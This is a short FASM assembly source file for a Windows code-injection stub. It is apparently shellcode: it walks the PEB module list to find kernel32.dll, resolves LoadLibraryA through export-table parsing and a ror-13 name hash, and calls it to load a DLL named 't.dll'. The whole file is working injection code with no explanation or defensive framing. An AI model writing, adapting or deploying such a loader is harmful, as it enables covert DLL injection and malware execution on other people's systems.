format PE gui
entry BeginInjection

include 'INCLUDE/win32a.inc'




section '.text'  code readable executable
;==========================================
BeginInjection:

sub esp, 6
mov dword [esp], 0x6c642e74
mov word [esp+4], 0x006c

mov ebx,[fs:dword 0x30]
mov ebx, [ebx+12]
mov ebx, [ebx+12]

Base:
mov esi, [ebx+48]
push 24
pop ecx
xor edi,edi

Collect:

xor eax,eax
lodsb
cmp al, 'a'
jl UpperCase
sub al, 32

UpperCase:
add edi, eax
loop Collect

mov eax, [ebx+24]
mov ebx, [ebx]

cmp edi, 816	 ;addition, hash not required. Not many will add up to 816 and have 24 in length

jne Base


mov ebx, eax
xor edx,edx

FindFunction:

mov esi, [ebx+60]
add esi, ebx
mov esi, [esi+120]
add esi, ebx
mov esi, [esi+32]
add esi, ebx
mov esi, [esi+(edx*4)]
add esi, ebx
xor edi, edi
push 12
pop ecx


CollectFunctionName:
xor eax, eax
lodsb
ror edi, 13
add edi, eax
loop CollectFunctionName

inc edx
cmp edi,0xEC0E4E8E	    ;hash of loadlibrary

jne FindFunction

dec edx

mov esi, [ebx+60]
add esi, ebx
mov esi, [esi+120]
add esi, ebx
mov ecx, [esi+28]  ;Address of functions
mov edi, [esi+36]  ;Address of ordinals

add edi, ebx
add ecx, ebx

mov ax, word [edi + (edx*2)]
mov ecx, [ecx + (eax*4)]
add ecx, ebx


push esp
call ecx



add esp, 6

ret
;==========================================














